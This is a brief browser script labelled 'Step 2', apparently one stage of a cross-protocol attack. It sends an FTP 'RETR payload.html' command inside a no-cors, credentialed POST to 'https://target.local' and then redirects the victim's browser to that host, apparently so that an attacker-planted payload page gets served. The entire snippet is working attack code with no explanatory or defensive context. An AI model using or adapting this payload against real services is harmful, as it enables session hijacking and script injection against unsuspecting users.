<script>
  // Step 2: only RETR, assuming control channel is logged in and PASV issued
  const cmds = [
    'RETR payload.html'
  ].join('\r\n') + '\r\n';

  fetch('https://target.local', {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'text/plain' },
    body: cmds,
    credentials: 'include'
  }).catch(() => {});

  setTimeout(function() {
    window.location = 'https://target.local';
  }, 3000);
</script>
